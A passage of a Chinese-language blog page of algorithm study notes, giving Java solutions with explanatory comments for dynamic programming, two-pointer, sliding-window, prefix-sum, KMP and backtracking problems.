MAX(前一天持有，前一天没有持有并且前一天是冷静期，今天买入(也就是说两天前就没有持有了))，因为冷静期只是影响的是卖出后的第二天不能买入，所以，如果要买入的话，只能是过了冷静期</span></span><br><span class="line">            <span class="comment">//也可以说是今天买入股票</span></span><br><span class="line">            dp[i][<span class="number">1</span>] = Math.max(dp[i - <span class="number">1</span>][<span class="number">1</span>], dp[i - <span class="number">2</span>][<span class="number">0</span>] - prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dp[prices.length - <span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLIS</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        dp[i]表示i之前包括i的以nums[i]结尾最长上升子序列的长度</span></span><br><span class="line"><span class="comment">        从0开始直到i一旦出现了num[i]&gt;nums[j]，则就好办了</span></span><br><span class="line"><span class="comment">        dp[i] = if(nums[i]&gt;nums[j])&#123;</span></span><br><span class="line"><span class="comment">            dp[i] = Math.max(dp[i],dp[j]+1);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span> [nums.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            dp[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]&gt;nums[j])&#123;</span><br><span class="line">                    dp[i] = Math.max(dp[i],dp[j]+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            result = Math.max(result,dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a>编辑距离</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDistance</span><span class="params">(String word1, String word2)</span> &#123;</span><br><span class="line">        <span class="comment">//dp[i][j] 0-i-1,0-j-1的编辑距离</span></span><br><span class="line">        <span class="type">int</span> [][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[word1.length()+<span class="number">1</span>][word2.length()+<span class="number">1</span>];</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i= <span class="number">0</span>;i&lt;=word1.length();i++)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;j&lt;=word2.length();j++)&#123;</span><br><span class="line">            dp[<span class="number">0</span>][j] =j;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i&lt;=word1.length();i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=word2.length();j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(word1.charAt(i-<span class="number">1</span>)==word2.charAt(j-<span class="number">1</span>))&#123;</span><br><span class="line">                    <span class="comment">//相同就不用编辑了</span></span><br><span class="line">                    dp[i][j] = dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//如果不同的话，就是插入删除 替换</span></span><br><span class="line">                    dp[i][j] = Math.min(dp[i-<span class="number">1</span>][j-<span class="number">1</span>],Math.min(dp[i-<span class="number">1</span>][j],dp[i][j-<span class="number">1</span>]))+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[word1.length()][word2.length()];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="回文"><a href="#回文" class="headerlink" title="回文"></a>回文</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countSubstrings</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        dp[i][j]表示i-j为止表示该字符串是否是回文</span></span><br><span class="line"><span class="comment">        if(s[i]==s[j])&#123;</span></span><br><span class="line"><span class="comment">            if(i==j)&#123;</span></span><br><span class="line"><span class="comment">                true;</span></span><br><span class="line"><span class="comment">            &#125;else if(abs(i-j)==1)&#123;</span></span><br><span class="line"><span class="comment">                true</span></span><br><span class="line"><span class="comment">            &#125;else if(abs(i-j)&gt;1)&#123;</span></span><br><span class="line"><span class="comment">                dp[i][j] = dp[i+1][j-1];</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">         <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[s.length()][s.length()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> s.length()-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">             <span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;s.length();j++)&#123;</span><br><span class="line">                 <span class="keyword">if</span>(s.charAt(i)==s.charAt(j))&#123;</span><br><span class="line">                     <span class="keyword">if</span>(i==j || j-i==<span class="number">1</span>)&#123;</span><br><span class="line">                         dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                     &#125;</span><br><span class="line">                     <span class="keyword">if</span>(j-i&gt;<span class="number">1</span>)&#123;</span><br><span class="line">                         <span class="comment">//就是因为这个所以我们的遍历顺序才是从上到下，左到右开始的   i+</span></span><br><span class="line">                         dp[i][j] = dp[i+<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">if</span>(dp[i][j])&#123;</span><br><span class="line">                     result++;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双指针法：从中心向两边扩散的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countSubstrings</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        找到回文中心，然后向两边开始扩散，</span></span><br><span class="line"><span class="comment">        可以将两个字符的中间作为一个中心，这种情况可以合并</span></span><br><span class="line"><span class="comment">        也可以将字符串作为中心，这种会分为两种情况，一个 字符作为中心，或者，两个字符作为中心</span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i&lt;s.length();i++)&#123;</span><br><span class="line">            result += helper(s,i,i,s.length());</span><br><span class="line">            result += helper(s,i,i+<span class="number">1</span>,s.length()); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">helper</span><span class="params">(String s,<span class="type">int</span> i,<span class="type">int</span> j ,<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="type">int</span> result= <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span> &amp;&amp; j&lt;n &amp;&amp; s.charAt(i)==s.charAt(j))&#123;</span><br><span class="line">            i--;</span><br><span class="line">            j++;</span><br><span class="line">            result++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组进行反转或者是字符串进行反转：<strong>先整体反转再局部反转</strong></p>
<p><strong>其实很多数组填充类的问题，都可以先预先给数组扩容带填充后的大小，然后在从后向前进行操作。</strong></p>
<h2 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] numbers, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span>[] result = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">endJ</span> <span class="operator">=</span> numbers.length-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span><span class="number">0</span>,right = numbers.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(numbers[left]+numbers[right]==target)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;left,right&#125;;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(numbers[left]+numbers[right]&gt;target)&#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">		</span><br></pre></td></tr></table></figure>

<p>三数之和</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (right &gt; left) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[left] + nums[right];</span><br><span class="line">                <span class="keyword">if</span> (sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result.add(Arrays.asList(nums[i], nums[left], nums[right]));</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[right] == nums[right - <span class="number">1</span>]) right--;</span><br><span class="line">                    <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) left++;</span><br><span class="line">                    </span><br><span class="line">                    right--; </span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSubArrayLen</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (end &lt; n) &#123;</span><br><span class="line">            sum += nums[end];</span><br><span class="line">            <span class="keyword">while</span> (sum &gt;= s) &#123;</span><br><span class="line">                ans = Math.min(ans, end - start + <span class="number">1</span>);</span><br><span class="line">                sum -= nums[start];</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            end++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">return</span> <span class="variable">ans</span> <span class="operator">=</span>= Integer.MAX_VALUE ? <span class="number">0</span> : ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最长不重复字串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> s string字符串 </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span> <span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="comment">//使用双指针来进行相关操作</span></span><br><span class="line">        <span class="keyword">if</span>(s.length()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        HashMap&lt;Character,Integer&gt; hashset = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>,right=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> result=<span class="number">1</span>,temp = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        hashset.put(s.charAt(<span class="number">0</span>),<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!hashset.containsKey(s.charAt(i)))&#123;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//找到重复的字符的位置</span></span><br><span class="line">                <span class="comment">//删除从前到重复字符串的所有字符</span></span><br><span class="line"><span class="comment">//                 left = hashset.get(s.charAt(i))+1;</span></span><br><span class="line">                left = Math.max(hashset.get(s.charAt(i))+<span class="number">1</span>,left);</span><br><span class="line">            &#125;</span><br><span class="line">            result = Math.max(i-left+<span class="number">1</span>,result);</span><br><span class="line">            hashset.put(s.charAt(i),i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前缀和：一般需要和hashmap进行组合，注意键值对分别代表甚意思。</p>
<p>统计最长的相同0，1，的子数组的大小：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findMaxLength</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//前缀和，最长的长度</span></span><br><span class="line">        HashMap&lt;Integer,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果nums[i]=0，将其转换为-1，</span></span><br><span class="line">        <span class="comment">//所以就可以将整个问题直接转换成，前缀和为0的最长连续子数组的大小。</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">preSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        hashmap.put(<span class="number">0</span>,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="comment">//只需要在遍历的时候遇到0就-1即可。不需要单独遍历整个数组</span></span><br><span class="line">            preSum = nums[i]==<span class="number">0</span>?preSum-<span class="number">1</span>:preSum+<span class="number">1</span>;            </span><br><span class="line">            <span class="keyword">if</span>(hashmap.containsKey(preSum))&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> hashmap.get(preSum);</span><br><span class="line">                ans = Math.max(ans,i-index);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//因为需要的是最长的子数组，所以并不需要覆盖，</span></span><br><span class="line">                hashmap.put(preSum,i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="KMP（字符串匹配）"><a href="#KMP（字符串匹配）" class="headerlink" title="KMP（字符串匹配）"></a>KMP（字符串匹配）</h1><p><strong>强烈建议大家把next数组打印出来，看看next数组里的规律，有助于理解KMP算法</strong></p>
<p><font color = red>字符串匹配要优先想到KMP算法</font></p>
<p>思想：当字符串出现不匹配的时候，可以根据已经匹配的内容来进行下一次匹配位置的计算。找到最长相等前后缀之后匹配失败的位置就是后缀子串的后面</p>
<blockquote>
<ul>
<li><p><strong>前缀是指不包含最后一个字符的所有以第一个字符开头的连续子串</strong></p>
</li>
<li><p><strong>后缀是指不包含第一个字符的所有以最后一个字符结尾的连续子串</strong>。</p>
</li>
<li><p>next数组（前缀表）：它记录了模式串与主串(文本串)不匹配的时候，模式串应该从哪里开始重新匹配。<strong>记录下标i之前（包括i）的字符串中，有多大长度的相同<u>前缀后缀</u>。</strong></p>
</li>
<li><p>next数组实现的时候通常是将整个数组值-1（计算出了整个模式的最长匹配表之后，将其向右移动一个位置）.</p>
</li>
</ul>
</blockquote>
<p><u>目标串永不回退，就只是需要移动模式串的起始位置。</u> 移动的位置是 j &#x3D; next[j] next[0]&#x3D;-1的时候</p>
<p>aabaa的最长相等前后缀是2</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">strStr</span><span class="params">(String haystack, String needle)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[]next = getNext(needle);</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;haystack.length();i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j&gt;=<span class="number">0</span>&amp;&amp;haystack.charAt(i)!=needle.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                <span class="comment">//模式子串进行回退</span></span><br><span class="line">                j = next[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(haystack.charAt(i)==needle.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(j == next.length-<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> i-j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] getNext(String s)&#123;</span><br><span class="line">        <span class="type">int</span> j=-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> [] next = <span class="keyword">new</span> <span class="title class_">int</span>[s.length()];</span><br><span class="line">        next[<span class="number">0</span>] = j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            <span class="comment">//进行回退</span></span><br><span class="line">            <span class="keyword">while</span>(j&gt;=<span class="number">0</span> &amp;&amp; s.charAt(i)!=s.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j = next[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i)==s.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            next[i] = j;</span><br><span class="line">            System.out.println(j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h1><p>回溯是递归的副产品，只要有递归就会有回溯 。<strong>使用回溯来控制循环的次数</strong>。回溯本身是穷举，也就是暴力。其返回值一般为void。</p>
<p><strong>剪枝精髓是：for循环在寻找起点的时候要有一个范围，如果这个起点到集合终止之间的元素已经不够 题目要求的k个元素了，就没有必要搜索了</strong></p>
<p>回溯法，一般可以解决如下几种问题：</p>
<ul>
<li><p>组合问题：N个数里面按一定规则找出k个数的集合</p>
</li>
<li><p>切割问题：一个字符串按一定规则有几种切割方式</p>
</li>
<li><p>子集问题：一个N个数的集合里有多少符合条件的子集</p>
</li>
<li><p>排列问题：N个数按一定规则全排列，有几种排列方式</p>
</li>
<li><p>棋盘问题：N皇后，解数独等等</p>
</li>
</ul>
<p>递归来做层叠嵌套（可以理解是开k层for循环），<strong>每一次的递归中嵌套一个for循环，那么递归就可以用于解决多层嵌套循环的问题了</strong></p>
<h2 id="回溯算法的模板："><a href="#回溯算法的模板：" class="headerlink" title="回溯算法的模板："></a>回溯算法的模板：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void backtracking(参数) &#123;</span><br><span class="line">    if (终止条件) &#123;</span><br><span class="line">        存放结果;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (选择：本层集合中元素（树中节点孩子的数量就是集合的大小）) &#123;</span><br><span class="line">        处理节点;</span><br><span class="line">        backtracking(路径，选择列表); // 递归</span><br><span class="line">        回溯，撤销处理结果</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;String&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">binaryTreePaths</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; paths = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        getBinaryTreePaths(root,paths);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getBinaryTreePaths</span><span class="params">(TreeNode root, List&lt;Integer&gt; paths)</span>&#123;</span><br><span class="line">        paths.add(root.val) ;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;paths.size()-<span class="number">1</span>;i++)&#123;</span><br><span class="line">                temp.append(String.valueOf(paths.get(i)) +<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            temp.append(paths.get(paths.size()-<span class="number">1</span>)) ;</span><br><span class="line">            result.add(temp.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">            getBinaryTreePaths(root.left,paths);</span><br><span class="line">            <span class="comment">//每一次递归之后都需要回溯一下</span></span><br><span class="line">            paths.remove(paths.size()-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">            getBinaryTreePaths(root.right,paths);</span><br><span class="line">            paths.remove(paths.size()-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>给定一个候选人编号的集合 candidates 和一个目标数 target ，找出 candidates 中所有可以使数字和为 target 的组合。candidates 中的每个数字在每个组合中只能使用 一次 。</p>
<p>注意：解集不能包含重复的组合。 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    因为是最后的解集中不能包含重复的数组，</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum2</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    </span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        helper(candidates,target,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span 